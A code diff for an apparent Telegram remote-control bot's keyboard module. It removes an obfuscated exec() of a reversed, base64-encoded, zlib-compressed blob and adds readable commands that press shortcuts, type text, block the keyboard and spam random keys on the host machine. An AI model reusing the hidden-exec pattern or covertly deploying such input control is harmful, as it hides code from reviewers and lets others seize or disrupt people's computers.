@@ -2,10 +2,302 @@ from pynput.keyboard import Key, Controller, Listener
 import random
 import time
 import constants
+import config
+import asyncio
+from command_registry import registry
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+async def block_callback(bot, call):
+    message = constants.KEYBOARD_BLOCK_documentation.format(
+        max_time_to_keyboard=config.max_time_to_keyboard_block)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
 
 
-exec((_)(b'==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'))
+async def spam_callback(bot, call):
+    message = constants.KEYBOARD_SPAM_documentation.format(
+        max_time_to_keyboard=config.max_time_to_keyboard_spam)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.KEYBOARD_SHORTCUT_command,
+    permission_name=constants.KEYBOARD_SHORTCUT,
+)
+async def keyboardshortcut(bot, message):
+    """
+    Press a key combination on the remote keyboard.
+
+    Args:
+        bot: AsyncTeleBot instance
+        message: Telegram message object
+
+    Example:
+        /keyboardshortcut ctrl+alt+delete
+        /keyboardshortcut shift+a
+    """
+
+    argument = getarg(message.text, constants.KEYBOARD_SHORTCUT_command)
+
+    answer = press_key(argument)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, message.chat.id, text=answer, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.KEYBOARD_BLOCK_command,
+    permission_name=constants.KEYBOARD_BLOCK,
+)
+async def keyboardblock(bot, message):
+    """
+    Temporarily block the remote keyboard for a specified time.
+
+    Args:
+        bot: AsyncTeleBot instance
+        message: Telegram message object
+
+    Example:
+        /keyboardblock 10
+    """
+
+    time_working = getarg(message.text, constants.KEYBOARD_BLOCK_command)
+    markup = getMarkupModes()
+
+    if not time_working.isdigit() or int(time_working) > config.max_time_to_keyboard_block:
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    time_working = int(time_working)
+
+    await send_message(bot, message.chat.id, text=constants.keyboardblock_blocked_message)
+
+    await block_keyboard(time_working)
+
+    await send_message(bot, message.chat.id, text=constants.keyboardblock_unblocked_message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.KEYBOARD_SPAM_command,
+    permission_name=constants.KEYBOARD_SPAM,
+)
+async def keyboardspam(bot, message):
+    """
+    Spam random keys on the remote keyboard for a specified time.
+
+    Args:
+        bot: AsyncTeleBot instance
+        message: Telegram message object
+
+    Example:
+        /keyboardspam 10
+    """
+
+    time_working = getarg(message.text, constants.KEYBOARD_SPAM_command)
+    markup = getMarkupModes()
+
+    if not time_working.isdigit() or int(time_working) > config.max_time_to_keyboard_spam:
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    time_working = int(time_working)
+
+    await send_message(bot, message.chat.id, text=constants.keyboardspam_started_message)
+
+    await spam(time_working)
+
+    await send_message(bot, message.chat.id, text=constants.keyboardspam_finished_message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.KEYBOARD_PRINT_command,
+    permission_name=constants.KEYBOARD_PRINT,
+)
+async def keyboardprint(bot, message):
+    """
+    Type text on the remote keyboard.
+
+    Args:
+        bot: AsyncTeleBot instance
+        message: Telegram message object
+
+    Example:
+        /keyboardprint Hello World
+    """
+
+    text = getarg(message.text, constants.KEYBOARD_PRINT_command)
+
+    print_text(text)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, message.chat.id, text=constants.keyboardprint_printed_message, reply_markup=markup)
+
+
+keyboard = Controller()
+
+spam_list = ['alt', 'alt_gr', 'alt_r', 'backspace', 'caps_lock', 'cmd', 'cmd_r', 'ctrl', 'ctrl_r', 'delete', 'down', 'end', 'enter', 'esc',
+             'home', 'insert', 'left', 'media_next', 'media_play_pause', 'media_previous', 'media_volume_down', 'media_volume_mute', 'media_volume_up', 'menu', 'num_lock', 'page_down', 'page_up', 'pause', 'print_screen', 'right', 'scroll_lock', 'shift', 'shift_r', 'space', 'tab', 'up',
+             'n', '9', '5', 'c', '/', '\\', ',', 'u', 'l', "'", 'q', ']', '4', '.', 'p', '2', ';', 'a', '-', 'f', 'i', 'm', '7', '3', 'b', 'd', 'z', 'e', '[', '=', 'h', '1', 't', 'y', 'g', 'o', 's', 'j', 'k', 'v', '6', 'r', '8', '0', 'x', 'w']
+
+
+class KeyboardBlocker:
+    """
+    Keyboard blocking utility using pynput Listener.
+    """
+
+    def __init__(self):
+        self.listener = None
+
+    def on_press(self, key):
+        """
+        Callback for key press events.
+
+        Returns:
+            None to suppress the key press
+        """
+        return None
+
+    def start(self):
+        """Start blocking keyboard input."""
+        if not self.listener:
+            self.listener = Listener(
+                on_press=self.on_press, suppress=True)
+            self.listener.start()
+
+    def stop(self):
+        """Stop blocking keyboard input."""
+        if self.listener:
+            self.listener.stop()
+            self.listener = None
+
+
+keyboard_blocker_obj = KeyboardBlocker()
+
+
+def print_text(text):
+    """
+    Type text using keyboard controller.
+
+    Args:
+        text: Text to type
+    """
+    keyboard.type(text)
+
+
+def press_key(keys):
+    """
+    Press and release a key combination.
+
+    Args:
+        keys: Key combination string (e.g., "ctrl+alt+delete")
+
+    Returns:
+        Success or error message string
+    """
+    answer = f'Successfully pressed {keys}.'
+    keys = keys.split('+')
+    try:
+        for key in keys:
+            press(key)
+
+        for key in keys:
+            release(key)
+    except Exception as ex:
+        answer = f'Invalid argument {keys}: ' + str(ex)
+    return answer
+
+
+def press(key):
+    """
+    Press a single key.
+
+    Args:
+        key: Key name or Key object
+    """
+    key_obj = getattr(Key, key, None)
+
+    if key_obj:
+        key = key_obj
+
+    keyboard.press(key)
+
+
+def release(key):
+    """
+    Release a single key.
+
+    Args:
+        key: Key name or Key object
+    """
+    key_obj = getattr(Key, key, None)
+
+    if key_obj:
+        key = key_obj
+
+    keyboard.release(key)
+
+
+async def block_keyboard(time_working=0):
+    """
+    Block keyboard for specified time.
+
+    Args:
+        time_working: Block duration in seconds
+    """
+    keyboard_blocker_obj.start()
+
+    await asyncio.sleep(time_working)
+
+    keyboard_blocker_obj.stop()
+
+
+def press_random_key():
+    """
+    Press a random key combination from spam_list.
+
+    Returns:
+        None if error occurs
+    """
+    count = random.randint(1, 4)
+    keys = []
+    for i in range(count):
+        keys.append(random.choice(spam_list))
+    key = '+'.join(keys)
+
+    try:
+        press_key(key)
+    except Exception as ex:
+        pass
+
+
+async def spam(time_working):
+    """
+    Spam random keys for specified time.
+
+    Args:
+        time_working: Spam duration in seconds
+    """
+    start_time = time.time()
+    while True:
+        end_time = time.time()
+
+        if end_time - start_time >= int(time_working):
+            break
+
+        press_random_key()
+
+        await asyncio.sleep(0.1)
+
+
+modes = {constants.KEYBOARD_SHORTCUT_preview: constants.KEYBOARD_SHORTCUT,
+         constants.KEYBOARD_BLOCK_preview: constants.KEYBOARD_BLOCK,
+         constants.KEYBOARD_SPAM_preview: constants.KEYBOARD_SPAM,
+         constants.KEYBOARD_PRINT_preview: constants.KEYBOARD_PRINT}
